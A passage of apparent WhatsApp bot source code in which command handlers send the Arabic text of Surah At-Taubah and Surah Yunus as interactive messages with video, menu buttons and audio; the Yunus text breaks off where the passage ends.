اَلْاَعْرَابُ اَشَدُّ كُفْرًا وَّنِفَاقًا وَّاَجْدَرُ اَلَّا يَعْلَمُوْا حُدُوْدَ مَآ اَنْزَلَ اللّٰهُ عَلٰى رَسُوْلِهٖ ۗ وَاللّٰهُ عَلِيْمٌ حَكِيْمٌ
وَمِنَ الْاَعْرَابِ مَنْ يَّتَّخِذُ مَا يُنْفِقُ مَغْرَمًا وَّيَتَرَبَّصُ بِكُمُ الدَّوَاۤىِٕرَ ۗ عَلَيْهِمْ دَاۤىِٕرَةُ السَّوْءِ ۗ وَاللّٰهُ سَمِيْعٌ عَلِيْمٌ
وَمِنَ الْاَعْرَابِ مَنْ يُّؤْمِنُ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ وَيَتَّخِذُ مَا يُنْفِقُ قُرُبٰتٍ عِنْدَ اللّٰهِ وَصَلَوٰتِ الرَّسُوْلِ ۗ اَلَآ اِنَّهَا قُرْبَةٌ لَّهُمْ ۗ سَيُدْخِلُهُمُ اللّٰهُ فِيْ رَحْمَتِهٖ ۗ اِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
وَالسّٰبِقُوْنَ الْاَوَّلُوْنَ مِنَ الْمُهٰجِرِيْنَ وَالْاَنْصَارِ وَالَّذِيْنَ اتَّبَعُوْهُمْ بِاِحْسَانٍ ۙ رَّضِيَ اللّٰهُ عَنْهُمْ وَرَضُوْا عَنْهُ وَاَعَدَّ لَهُمْ جَنّٰتٍ تَجْرِيْ تَحْتَهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَآ اَبَدًا ۗ ذٰلِكَ الْفَوْزُ الْعَظِيْمُ
وَمِمَّنْ حَوْلَكُمْ مِّنَ الْاَعْرَابِ مُنٰفِقُوْنَ ۚ وَمِنْ اَهْلِ الْمَدِيْنَةِ ۚ مَرَدُوْا عَلَى النِّفَاقِ لَا تَعْلَمُهُمْ ۗ نَحْنُ نَعْلَمُهُمْ ۗ سَنُعَذِّبُهُمْ مَّرَّتَيْنِ ثُمَّ يُرَدُّوْنَ اِلٰى عَذَابٍ عَظِيْمٍ
وَاٰخَرُوْنَ اعْتَرَفُوْا بِذُنُوْبِهِمْ خَلَطُوْا عَمَلًا صَالِحًا وَّاٰخَرَ سَيِّئًا ۗ عَسَى اللّٰهُ اَنْ يَّتُوْبَ عَلَيْهِمْ ۗ اِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
خُذْ مِنْ اَمْوَالِهِمْ صَدَقَةً تُطَهِّرُهُمْ وَتُزَكِّيْهِمْ بِهَا وَصَلِّ عَلَيْهِمْ ۗ اِنَّ صَلٰوتَكَ سَكَنٌ لَّهُمْ ۗ وَاللّٰهُ سَمِيْعٌ عَلِيْمٌ
اَلَمْ يَعْلَمُوْٓا اَنَّ اللّٰهَ هُوَ يَقْبَلُ التَّوْبَةَ عَنْ عِبَادِهٖ وَيَأْخُذُ الصَّدَقٰتِ وَاَنَّ اللّٰهَ هُوَ التَّوَّابُ الرَّحِيْمُ
وَقُلِ اعْمَلُوْا فَسَيَرَى اللّٰهُ عَمَلَكُمْ وَرَسُوْلُهٗ وَالْمُؤْمِنُوْنَ ۚ وَسَتُرَدُّوْنَ اِلٰى عَالِمِ الْغَيْبِ وَالشَّهَادَةِ فَيُنَبِّئُكُمْ بِمَا كُنْتُمْ تَعْمَلُوْنَ
وَاٰخَرُوْنَ مُرْجَوْنَ لِاَمْرِ اللّٰهِ اِمَّا يُعَذِّبُهُمْ وَاِمَّا يَتُوْبُ عَلَيْهِمْ ۗ وَاللّٰهُ عَلِيْمٌ حَكِيْمٌ
وَالَّذِيْنَ اتَّخَذُوْا مَسْجِدًا ضِرَارًا وَّكُفْرًا وَّتَفْرِيْقًاۢ بَيْنَ الْمُؤْمِنِيْنَ وَاِرْصَادًا لِّمَنْ حَارَبَ اللّٰهَ وَرَسُوْلَهٗ مِنْ قَبْلُ ۗ وَلَيَحْلِفُنَّ اِنْ اَرَدْنَآ اِلَّا الْحُسْنٰى ۗ وَاللّٰهُ يَشْهَدُ اِنَّهُمْ لَكٰذِبُوْنَ
لَا تَقُمْ فِيْهِ اَبَدًا ۗ لَمَسْجِدٌ اُسِّسَ عَلَى التَّقْوٰى مِنْ اَوَّلِ يَوْمٍ اَحَقُّ اَنْ تَقُوْمَ فِيْهِ ۗ فِيْهِ رِجَالٌ يُّحِبُّوْنَ اَنْ يَّتَطَهَّرُوْا ۗ وَاللّٰهُ يُحِبُّ الْمُطَّهِّرِيْنَ
اَفَمَنْ اَسَّسَ بُنْيَانَهٗ عَلٰى تَقْوٰى مِنَ اللّٰهِ وَرِضْوَانٍ خَيْرٌ اَمْ مَّنْ اَسَّسَ بُنْيَانَهٗ عَلٰى شَفَا جُرُفٍ هَارٍ فَانْهَارَ بِهٖ فِيْ نَارِ جَهَنَّمَ ۗ وَاللّٰهُ لَا يَهْدِى الْقَوْمَ الظّٰلِمِيْنَ
لَا يَزَالُ بُنْيَانُهُمُ الَّذِيْ بَنَوْا رِيْبَةً فِيْ قُلُوْبِهِمْ اِلَّآ اَنْ تَقَطَّعَ قُلُوْبُهُمْ ۗ وَاللّٰهُ عَلِيْمٌ حَكِيْمٌ
اِنَّ اللّٰهَ اشْتَرٰى مِنَ الْمُؤْمِنِيْنَ اَنْفُسَهُمْ وَاَمْوَالَهُمْ بِاَنَّ لَهُمُ الْجَنَّةَ ۗ يُقَاتِلُوْنَ فِيْ سَبِيْلِ اللّٰهِ فَيَقْتُلُوْنَ وَيُقْتَلُوْنَ ۗ وَعْدًا عَلَيْهِ حَقًّا فِى التَّوْرٰىةِ وَالْاِنْجِيْلِ وَالْقُرْاٰنِ ۗ وَمَنْ اَوْفٰى بِعَهْدِهٖ مِنَ اللّٰهِ فَاسْتَبْشِرُوْا بِبَيْعِكُمُ الَّذِيْ بَايَعْتُمْ بِهٖ ۗ وَذٰلِكَ هُوَ الْفَوْزُ الْعَظِيْمُ
اَلتَّاۤىِٕبُوْنَ الْعٰبِدُوْنَ الْحَامِدُوْنَ السَّاۤىِٕحُوْنَ الرّٰكِعُوْنَ السّٰجِدُوْنَ الْاٰمِرُوْنَ بِالْمَعْرُوْفِ وَالنَّاهُوْنَ عَنِ الْمُنْكَرِ وَالْحٰفِظُوْنَ لِحُدُوْدِ اللّٰهِ ۗ وَبَشِّرِ الْمُؤْمِنِيْنَ
مَا كَانَ لِلنَّبِيِّ وَالَّذِيْنَ اٰمَنُوْٓا اَنْ يَّسْتَغْفِرُوْا لِلْمُشْرِكِيْنَ وَلَوْ كَانُوْٓا اُولِيْ قُرْبٰى مِنْۢ بَعْدِ مَا تَبَيَّنَ لَهُمْ اَنَّهُمْ اَصْحٰبُ الْجَحِيْمِ
وَمَا كَانَ اسْتِغْفَارُ اِبْرٰهِيْمَ لِاَبِيْهِ اِلَّا عَنْ مَّوْعِدَةٍ وَّعَدَهَآ اِيَّاهُ ۚ فَلَمَّا تَبَيَّنَ لَهٗٓ اَنَّهٗ عَدُوٌّ لِّلّٰهِ تَبَرَّاَ مِنْهُ ۗ اِنَّ اِبْرٰهِيْمَ لَاَوَّاهٌ حَلِيْمٌ
وَمَا كَانَ اللّٰهُ لِيُضِلَّ قَوْمًاۢ بَعْدَ اِذْ هَدٰىهُمْ حَتّٰى يُبَيِّنَ لَهُمْ مَّا يَتَّقُوْنَ ۗ اِنَّ اللّٰهَ بِكُلِّ شَيْءٍ عَلِيْمٌ
اِنَّ اللّٰهَ لَهٗ مُلْكُ السَّمٰوٰتِ وَالْاَرْضِ ۗ يُحْيٖ وَيُمِيْتُ ۗ وَمَا لَكُمْ مِّنْ دُوْنِ اللّٰهِ مِنْ وَّلِيٍّ وَّلَا نَصِيْرٍ
لَقَدْ تَّابَ اللّٰهُ عَلَى النَّبِيِّ وَالْمُهٰجِرِيْنَ وَالْاَنْصَارِ الَّذِيْنَ اتَّبَعُوْهُ فِيْ سَاعَةِ الْعُسْرَةِ مِنْۢ بَعْدِ مَا كَادَ يَزِيْغُ قُلُوْبُ فَرِيْقٍ مِّنْهُمْ ثُمَّ تَابَ عَلَيْهِمْ ۗ اِنَّهٗ بِهِمْ رَءُوْفٌ رَّحِيْمٌ
وَعَلَى الثَّلٰثَةِ الَّذِيْنَ خُلِّفُوْا ۗ حَتّٰىٓ اِذَا ضَاقَتْ عَلَيْهِمُ الْاَرْضُ بِمَا رَحُبَتْ وَضَاقَتْ عَلَيْهِمْ اَنْفُسُهُمْ وَظَنُّوْٓا اَنْ لَّا مَلْجَاَ مِنَ اللّٰهِ اِلَّآ اِلَيْهِ ثُمَّ تَابَ عَلَيْهِمْ لِيَتُوْبُوْا ۗ اِنَّ اللّٰهَ هُوَ التَّوَّابُ الرَّحِيْمُ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوا اتَّقُوا اللّٰهَ وَكُوْنُوْا مَعَ الصّٰدِقِيْنَ
مَا كَانَ لِاَهْلِ الْمَدِيْنَةِ وَمَنْ حَوْلَهُمْ مِّنَ الْاَعْرَابِ اَنْ يَّتَخَلَّفُوْا عَنْ رَّسُوْلِ اللّٰهِ وَلَا يَرْغَبُوْا بِاَنْفُسِهِمْ عَنْ نَّفْسِهٖ ۗ ذٰلِكَ بِاَنَّهُمْ لَا يُصِيْبُهُمْ ظَمَاٌ وَّلَا نَصَبٌ وَّلَا مَخْمَصَةٌ فِيْ سَبِيْلِ اللّٰهِ وَلَا يَطَـُٔوْنَ مَوْطِئًا يَّغِيْظُ الْكُفَّارَ وَلَا يَنَالُوْنَ مِنْ عَدُوٍّ نَّيْلًا اِلَّا كُتِبَ لَهُمْ بِهٖ عَمَلٌ صَالِحٌ ۗ اِنَّ اللّٰهَ لَا يُضِيْعُ اَجْرَ الْمُحْسِنِيْنَ
وَلَا يُنْفِقُوْنَ نَفَقَةً صَغِيْرَةً وَّلَا كَبِيْرَةً وَّلَا يَقْطَعُوْنَ وَادِيًا اِلَّا كُتِبَ لَهُمْ لِيَجْزِيَهُمُ اللّٰهُ اَحْسَنَ مَا كَانُوْا يَعْمَلُوْنَ
وَمَا كَانَ الْمُؤْمِنُوْنَ لِيَنْفِرُوْا كَاۤفَّةً ۗ فَلَوْلَا نَفَرَ مِنْ كُلِّ فِرْقَةٍ مِّنْهُمْ طَاۤىِٕفَةٌ لِّيَتَفَقَّهُوْا فِى الدِّيْنِ وَلِيُنْذِرُوْا قَوْمَهُمْ اِذَا رَجَعُوْٓا اِلَيْهِمْ لَعَلَّهُمْ يَحْذَرُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا قَاتِلُوا الَّذِيْنَ يَلُوْنَكُمْ مِّنَ الْكُفَّارِ وَلْيَجِدُوْا فِيْكُمْ غِلْظَةً ۗ وَاعْلَمُوْٓا اَنَّ اللّٰهَ مَعَ الْمُتَّقِيْنَ
وَاِذَا مَآ اُنْزِلَتْ سُوْرَةٌ فَمِنْهُمْ مَّنْ يَّقُوْلُ اَيُّكُمْ زَادَتْهُ هٰذِهٖٓ اِيْمَانًا ۚ فَاَمَّا الَّذِيْنَ اٰمَنُوْا فَزَادَتْهُمْ اِيْمَانًا وَّهُمْ يَسْتَبْشِرُوْنَ
وَاَمَّا الَّذِيْنَ فِيْ قُلُوْبِهِمْ مَّرَضٌ فَزَادَتْهُمْ رِجْسًا اِلٰى رِجْسِهِمْ وَمَاتُوْا وَهُمْ كٰفِرُوْنَ
اَوَلَا يَرَوْنَ اَنَّهُمْ يُفْتَنُوْنَ فِيْ كُلِّ عَامٍ مَّرَّةً اَوْ مَرَّتَيْنِ ثُمَّ لَا يَتُوْبُوْنَ وَلَا هُمْ يَذَّكَّرُوْنَ
وَاِذَا مَآ اُنْزِلَتْ سُوْرَةٌ نَّظَرَ بَعْضُهُمْ اِلٰى بَعْضٍۗ هَلْ يَرٰىكُمْ مِّنْ اَحَدٍ ثُمَّ انْصَرَفُوْا ۗ صَرَفَ اللّٰهُ قُلُوْبَهُمْ بِاَنَّهُمْ قَوْمٌ لَّا يَفْقَهُوْنَ
لَقَدْ جَاۤءَكُمْ رَسُوْلٌ مِّنْ اَنْفُسِكُمْ عَزِيْزٌ عَلَيْهِ مَا عَنِتُّمْ حَرِيْصٌ عَلَيْكُمْ بِالْمُؤْمِنِيْنَ رَءُوْفٌ رَّحِيْمٌ
فَاِنْ تَوَلَّوْا فَقُلْ حَسْبِيَ اللّٰهُ ۖ لَآ اِلٰهَ اِلَّا هُوَ ۗ عَلَيْهِ تَوَكَّلْتُ ۚ وَهُوَ رَبُّ الْعَرْشِ الْعَظِيْمِ

\`[📖] 𝐒𝐇𝐀𝐃𝐀𝐐𝐀𝐋𝐀𝐇𝐔𝐋 '𝐀𝐃𝐙𝐈𝐌 [📖]\`
`

 const msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: teks
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: true,
 videoMessage: (
 await prepareWAMessageMedia(
 { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780066699.mp4" } },
 { upload: Asepp.waUploadToServer }
 )
 ).videoMessage,
 gifPlayback: true
 }),
 contextInfo: {
 isForwarded: true,
 forwardingScore: 999,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363418538598013@newsletter',
 newsletterName: '𝐀𝐋-𝐐𝐔𝐑𝐀𝐍',
 serverMessageId: 145
 }
 },
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 messageParamsJson: JSON.stringify({
 limited_time_offer: {
 text: "𝐀𝐓-𝐓𝐀𝐔𝐁𝐀𝐇",
 url: `https://quran.com/9`,
 copy_code: "BISMILLAH",
 expiration_time: Date.now() * 999
 },
 bottom_sheet: {
 in_thread_buttons_limit: 1,
 divider_indices: [0],
 list_title: "CLICK",
 button_title: "© AT-TAUBAH"
 }
 }),
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "© AT-TAUBAH",
 sections: [{
 title: "Menu Surat",
 highlight_label: "𝐁𝐀𝐂𝐀 𝐋𝐄𝐍𝐆𝐊𝐀𝐏 🚀",
 rows: [
 { title: "𝐓𝐞𝐤𝐬 𝐀𝐫𝐚𝐛", description: "𝐀𝐲𝐚𝐭 1-129", id: `${prefix}at-taubah` }
 ]
 }]
 })
 }
 ]
 })
 })
 }
 }
 },
 { quoted: m }
 )

 await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

 await Asepp.sendMessage(
 m.chat,
 {
 audio: fs.readFileSync("./image/kacaw.mp3"),
 mimetype: "audio/mp4",
 ptt: false
 },
 { quoted: m }
 )
}
break

case 'yunus': {
 await Asepp.sendMessage(m.chat, { react: { text: "📖", key: m.key } })

 let teks = `\`𝗦𝗨𝗥𝗔𝗧 𝗬𝗨𝗡𝗨𝗦\`
Surat ke-10 | 109 ayat | Makkiyah | Nabi Yunus

⌲ \`𝐓𝐄𝐊𝐒 𝐀𝐑𝐀𝐁 𝐋𝐄𝐍𝐆𝐊𝐀𝐏\`
بِسْمِ اللّٰهِ الرَّحْمٰنِ الرَّحِيْمِ
الۤرٰ ۗ تِلْكَ اٰيٰتُ الْكِتٰبِ الْحَكِيْمِ
اَكَانَ لِلنَّاسِ عَجَبًا اَنْ اَوْحَيْنَآ اِلٰى رَجُلٍ مِّنْهُمْ اَنْ اَنْذِرِ النَّاسَ وَبَشِّرِ الَّذِيْنَ اٰمَنُوْٓا اَنَّ لَهُمْ قَدَمَ صِدْقٍ عِنْدَ رَبِّهِمْ ۗ قَالَ الْكٰفِرُوْنَ اِنَّ هٰذَا لَسٰحِرٌ مُّبِيْنٌ
اِنَّ رَبَّكُمُ اللّٰهُ الَّذِيْ خَلَقَ السَّمٰوٰتِ وَالْاَرْضَ فِيْ سِتَّةِ اَيَّامٍ ثُمَّ اسْتَوٰى عَلَى الْعَرْشِ يُدَبِّرُ الْاَمْرَ ۗ مَا مِنْ شَفِيْعٍ اِلَّا مِنْۢ بَعْدِ اِذْنِهٖ ۗ ذٰلِكُمُ اللّٰهُ رَبُّكُمْ فَاعْبُدُوْهُ ۗ اَفَلَا تَذَكَّرُوْنَ
اِلَيْهِ مَرْجِعُكُمْ جَمِيْعًا ۗ وَعْدَ اللّٰهِ حَقًّا ۗ اِنَّهٗ يَبْدَؤُا الْخَلْقَ ثُمَّ يُعِيْدُهٗ لِيَجْزِيَ الَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ بِالْقِسْطِ ۗ وَالَّذِيْنَ كَفَرُوْا لَهُمْ شَرَابٌ مِّنْ حَمِيْمٍ وَّعَذَابٌ اَلِيْمٌ ۢ بِمَا كَانُوْا يَكْفُرُوْنَ
هُوَ الَّذِيْ جَعَلَ الشَّمْسَ ضِيَاۤءً وَّالْقَمَرَ نُوْرًا وَّقَدَّرَهٗ مَنَازِلَ لِتَعْلَمُوْا عَدَ السِّنِيْنَ وَالْحِسَابَ ۗ مَا خَلَقَ اللّٰهُ ذٰلِكَ اِلَّا بِالْحَقِّ ۚ يُفَصِّلُ الْاٰيٰتِ لِقَوْمٍ يَّعْلَمُوْنَ
اِنَّ فِى اخْتِلَافِ الَّيْلِ وَالنَّهَارِ وَمَا خَلَقَ اللّٰهُ فِى السَّمٰوٰتِ وَالْاَرْضِ لَاٰيٰتٍ لِّقَوْمٍ يَّتَّقُوْنَ
اِنَّ الَّذِيْنَ لَا يَرْجُوْنَ لِقَاۤءَنَا وَرَضُوْا بِالْحَيٰوةِ الدُّنْيَا وَاطْمَاَنُّوْا بِهَا وَالَّذِيْنَ هُمْ عَنْ اٰيٰتِنَا غٰفِلُوْنَ
اُولٰۤىِٕكَ مَأْوٰىهُمُ النَّارُ بِمَا كَانُوْا يَكْسِبُوْنَ
اِنَّ الَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ يَهْدِيْهِمْ رَبُّهُمْ بِاِيْمَانِهِمْ ۚ تَجْرِيْ مِنْ تَحْتِهِمُ الْاَنْهٰرُ فِيْ جَنّٰتِ النَّعِيْمِ
دَعْوٰىهُمْ فِيْهَا سُبْحٰنَكَ اللّٰهُمَّ وَتَحِيَّتُهُمْ فِيْهَا سَلٰمٌ ۚ وَاٰخِرُ دَعْوٰىهُمْ اَنِ الْحَمْدُ لِلّٰهِ رَبِّ الْعٰلَمِيْنَ
وَلَوْ يُعَجِّلُ اللّٰهُ لِلنَّاسِ الشَّرَّ اسْتِعْجَالَهُمْ بِالْخَيْرِ لَقُضِيَ اِلَيْهِمْ اَجَلُهُمْ ۗ فَنَذَرُ الَّذِيْنَ لَا يَرْجُوْنَ لِقَاۤءَنَا فِيْ طُغْيَانِهِمْ يَعْمَهُوْنَ
وَاِذَا مَسَّ الْاِنْسَانَ الضُّرُّ دَعَانَا لِجَنْۢبِهٖٓ اَوْ قَاعِدًا اَوْ قَاۤىِٕمًا ۚ فَلَمَّا كَشَفْنَا عَنْهُ ضُرَّهٗ مَرَّ كَاَنْ لَّمْ يَدْعُنَآ اِلٰى ضُرٍّ مَّسَّهٗ ۗ كَذٰلِكَ زُيِّنَ لِلْمُسْرِفِيْنَ مَا كَانُوْا يَعْمَلُوْنَ
وَلَقَدْ اَهْلَكْنَا الْقُرُوْنَ مِنْ قَبْلِكُمْ لَمَّا ظَلَمُوْا ۙ وَجَاۤءَتْهُمْ رُسُلُهُمْ بِالْبَيِّنٰتِ وَمَا كَانُوْا لِيُؤْمِنُوْا ۗ كَذٰلِكَ نَجْزِى الْقَوْمَ الْمُجْرِمِيْنَ
ثُمَّ جَعَلْنٰكُمْ خَلٰۤىِٕفَ فِى الْاَرْضِ مِنْۢ بَعْدِهِمْ لِنَنْظُرَ كَيْفَ تَعْمَلُوْنَ
وَاِذَا تُتْلٰى عَلَيْهِمْ اٰيَاتُنَا بَيِّنٰتٍ ۙ قَالَ الَّذِيْنَ لَا يَرْجُوْنَ لِقَاۤءَنَا ائْتِ بِقُرْاٰنٍ غَيْرِ هٰذَآ اَوْ بَدِّلْهُ ۗ قُلْ مَا يَكُوْنُ لِيْٓ اَنْ اُبَدِّلَهٗ مِنْ تِلْقَاۤئِ نَفْسِيْ ۚ اِنْ اَتَّبِعُ اِلَّا مَا يُوْحٰٓى اِلَيَّ ۚ اِنِّيْٓ اَخَافُ اِنْ عَصَيْتُ رَبِّيْ عَذَابَ يَوْمٍ عَظِيْمٍ
قُلْ لَّوْ شَاۤءَ اللّٰهُ مَا تَلَوْتُهٗ عَلَيْكُمْ وَلَآ اَدْرٰىكُمْ بِهٖ ۖ فَقَدْ لَبِثْتُ فِيْكُمْ عُمُرًا مِّنْ قَبْلِهٖ ۗ اَفَلَا تَعْقِلُوْنَ
فَمَنْ اَظْلَمُ مِمَّنِ افْتَرٰى عَلَى اللّٰهِ كَذِبًا اَوْ كَذَّبَ بِاٰيٰتِهٖ ۗ اِنَّهٗ لَا يُفْلِحُ الْمُجْرِمُوْنَ
وَيَعْبُدُوْنَ مِنْ دُوْنِ اللّٰهِ مَا لَا يَضُرُّهُمْ وَلَا يَنْفَعُهُمْ وَيَقُوْلُوْنَ هٰٓؤُلَاۤءِ شُفَعَاۤؤُنَا عِنْدَ اللّٰهِ ۗ قُلْ اَتُنَبِّـُٔوْنَ اللّٰهَ بِمَا لَا يَعْلَمُ فِى السَّمٰوٰتِ وَلَا فِى الْاَرْضِ ۗ سُبْحٰنَهٗ وَتَعٰلٰى عَمَّا يُشْرِكُوْنَ
وَمَا كَانَ النَّاسُ اِلَّآ اُمَّةً وَّاحِدَةً فَاخْتَلَفُوْا ۗ وَلَوْلَا كَلِمَةٌ سَبَقَتْ مِنْ رَّبِّكَ لَقُضِيَ بَيْنَهُمْ فِيْمَا فِيْهِ يَخْتَلِفُوْنَ
وَيَقُوْلُوْنَ لَوْلَآ اُنْزِلَ عَلَيْهِ اٰيَةٌ مِّنْ رَّبِّهٖ ۚ فَقُلْ اِنَّمَا الْغَيْبُ لِلّٰهِ فَانْتَظِرُوْا ۚ اِنِّيْ مَعَكُمْ مِّنَ الْمُنْتَظِرِيْنَ
وَاِذَآ اَذَقْنَا النَّاسَ رَحْمَةً مِّنْۢ بَعْدِ ضَرَّاۤءَ مَسَّتْهُمْ اِذَا لَهُمْ مَّكْرٌ فِيْٓ اٰيَاتِنَا ۗ قُلِ اللّٰهُ اَسْرَعُ مَكْرًا ۗ اِنَّ رُسُلَنَا يَكْتُبُوْنَ مَا تَمْكُرُوْنَ
هُوَ الَّذِيْ يُسَيِّرُكُمْ فِى الْبَرِّ وَالْبَحْرِ ۗ حَتّٰىٓ اِذَا كُنْتُمْ فِى الْفُلْكِ ۚ وَجَرَيْنَ بِهِمْ بِرِيْحٍ طَيِّبَةٍ وَّفَرِحُوْا بِهَا جَاۤءَتْهَا رِيْحٌ عَاصِفٌ وَّجَاۤءَهُمُ الْمَوْجُ مِنْ كُلِّ مَكَانٍ وَّظَنُّوْٓا اَنَّهُمْ اُحِيْطَ بِهِمْ ۙ دَعَوُا اللّٰهَ مُخْلِصِيْنَ لَهُ الدِّيْنَ ۚ لَىِٕنْ اَنْجَيْتَنَا مِنْ هٰذِهٖ لَنَكُوْنَنَّ مِنَ الشّٰكِرِيْنَ
فَلَمَّآ اَنْجٰىهُمْ اِذَا هُمْ يَبْغُوْنَ فِى الْاَرْضِ بِغَيْرِ الْحَقِّ ۗ يٰٓاَيُّهَا النَّاسُ اِنَّمَا بَغْيُكُمْ عَلٰٓى اَنْفُسِكُمْ ۙ مَّتَاعَ الْحَيٰوةِ الدُّنْيَا ۖ ثُمَّ اِلَيْنَا مَرْجِعُكُمْ فَنُنَبِّئُكُمْ بِمَا كُنْتُمْ تَعْمَلُوْنَ
اِنَّمَا مَثَلُ الْحَيٰوةِ الدُّنْيَا كَمَاۤءٍ اَنْزَلْنٰهُ مِنَ السَّمَاۤءِ فَاخْتَلَطَ بِهٖ نَبَاتُ الْاَرْضِ مِمَّا يَأْكُلُ النَّاسُ وَالْاَنْعَامُ ۗ حَتّٰىٓ اِذَآ اَخَذَتِ الْاَرْضُ زُخْرُفَهَا وَازَّيَّنَتْ وَظَنَّ اَهْلُهَآ اَنَّهُمْ قٰدِرُوْنَ عَلَيْهَآ ۙ اَتٰىهَآ اَمْرُنَا لَيْلًا اَوْ نَهَارًا فَجَعَلْنٰهَا حَصِيْدًا كَاَنْ لَّمْ تَغْنَ بِالْاَمْسِ ۗ كَذٰلِكَ نُفَصِّلُ الْاٰيٰتِ لِقَوْمٍ يَّتَفَكَّرُوْنَ
وَاللّٰهُ يَدْعُوْٓا اِلٰى دَارِ السَّلٰمِ ۗ وَيَهْدِيْ مَنْ يَّشَاۤءُ اِلٰى صِرَاطٍ مُّسْتَقِيْمٍ
لِلَّذِيْنَ اَحْسَنُوا الْحُسْنٰى وَزِيَادَةٌ ۗ وَلَا يَرْهَقُ وُجُوْهَهُمْ قَتَرٌ وَّلَا ذِلَّةٌ ۗ اُولٰۤىِٕكَ اَصْحٰبُ الْجَنَّةِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
وَالَّذِيْنَ كَسَبُوا السَّيِّاٰتِ جَزَاۤءُ سَيِّئَةٍ ۢ بِمِثْلِهَا ۙ وَتَرْهَقُهُمْ ذِلَّةٌ ۗ مَا لَهُمْ مِّنَ اللّٰهِ مِنْ عَاصِمٍ ۚ كَاَنَّمَآ اُغْشِيَتْ وُجُوْهُمْ قِطَعًا مِّنَ الَّيْلِ مُظْلِمًا ۗ اُولٰۤىِٕكَ اَصْحٰبُ النَّارِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
وَيَوْمَ نَحْشُرُهُمْ جَمِيْعًا ثُمَّ نَقُوْلُ لِلَّذِيْنَ اَشْرَكُوْا مَكَانَكُمْ اَنْتُمْ وَشُرَكَاۤؤُكُمْ ۚ فَزَيَّلْنَا بَيْنَهُمْ وَقَالَ شُرَكَاۤؤُهُمْ مَّا كُنْتُمْ اِيَّانَا تَعْبُدُوْنَ
فَكَفٰى بِاللّٰهِ شَهِيْدًاۢ بَيْنَنَا وَبَيْنَكُمْ اِنْ كُنَّا عَنْ عِبَادَتِكُمْ لَغٰفِلِيْنَ
هُنَالِكَ تَبْلُوْا كُلُّ نَفْسٍ مَّآ اَسْلَفَتْ ۚ وَرُدُّوْٓا اِلَى اللّٰهِ مَوْلٰىهُمُ الْحَقِّ ۚ وَضَلَّ عَنْهُمْ مَّا كَانُوْا يَفْتَرُوْنَ
قُلْ مَنْ يَّرْزُقُكُمْ مِّنَ السَّمَاۤءِ وَالْاَرْضِ اَمَّنْ يَّمْلِكُ السَّمْعَ وَالْاَبْصَارَ وَمَنْ يُّخْرِجُ الْحَيَّ مِنَ الْمَيِّتِ وَيُخْرِجُ الْمَيِّتَ مِنَ الْحَيِّ وَمَنْ يُّدَبِّرُ الْاَمْرَ ۗ فَسَيَقُوْلُوْنَ اللّٰهُ ۚ فَقُلْ اَفَلَا تَتَّقُوْنَ
فَذٰلِكُمُ اللّٰهُ رَبُّكُمُ الْحَقُّ ۚ فَمَاذَا بَعْدَ الْحَقِّ اِلَّا الضَّلٰلُ ۚ فَاَنّٰى تُصْرَفُوْنَ
كَذٰلِكَ حَقَّتْ كَلِمَتُ رَبِّكَ عَلَى الَّذِيْنَ فَسَقُوْٓا اَنَّهُمْ لَا يُؤْمِنُوْنَ
قُلْ هَلْ مِنْ شُرَكَاۤىِٕكُمْ مَّنْ يَّبْدَؤُا الْخَلْقَ ثُمَّ يُعِيْدُهٗ ۗ قُلِ اللّٰهُ يَبْدَؤُا الْخَلْقَ ثُمَّ يُعِيْدُهٗ ۚ فَاَنّٰى تُؤْفَكُوْنَ
قُلْ هَلْ مِنْ شُرَكَاۤىِٕكُمْ مَّنْ يَّهْدِيْٓ اِلَى الْحَقِّ ۗ قُلِ اللّٰهُ يَهْدِيْ لِلْحَقِّ ۗ اَفَمَنْ يَّهْدِيْٓ اِلَى الْحَقِّ اَحَقُّ اَنْ يُّتَّبَعَ اَمَّنْ لَّا يَهِدِّيْٓ اِلَّآ اَنْ يُّهْدٰى ۚ فَمَا لَكُمْ كَيْفَ تَحْكُمُوْنَ
وَمَا يَتَّبِعُ اَكْثَرُهُمْ اِلَّا ظَنًّا ۚ اِنَّ الظَّنَّ لَا يُغْنِيْ مِنَ الْحَقِّ شَيْـًٔا ۗ اِنَّ اللّٰهَ عَلِيْمٌۢ بِمَا يَفْعَلُوْنَ
وَمَا كَانَ هٰذَا الْقُرْاٰنُ اَنْ يُّفْتَرٰى مِنْ دُوْنِ اللّٰهِ وَلٰكِنْ تَصْدِيْقَ الَّذِيْ بَيْنَ يَدَيْهِ وَتَفْصِيْلَ الْكِتٰبِ لَا رَيْبَ فِيْهِ مِنْ رَّبِّ الْعٰلَمِيْنَ
اَمْ يَقُوْلُوْنَ افْتَرٰىهُ ۗ قُلْ فَأْتُوْا بِسُوْرَةٍ مِّثْلِهٖ وَادْعُوْا مَنِ اسْتَطَعْتُمْ مِّنْ دُوْنِ اللّٰهِ اِنْ كُنْتُمْ صٰدِقِيْنَ
بَلْ كَذَّبُوْا بِمَا لَمْ يُحِيْطُوْا بِعِلْمِهٖ وَلَمَّا يَأْتِهِمْ تَأْوِيْلُهٗ ۗ كَذٰلِكَ كَذَّبَ الَّذِيْنَ مِنْ قَبْلِهِمْ فَانْظُرْ كَيْفَ كَانَ عَاقِبَةُ الظّٰلِمِيْنَ
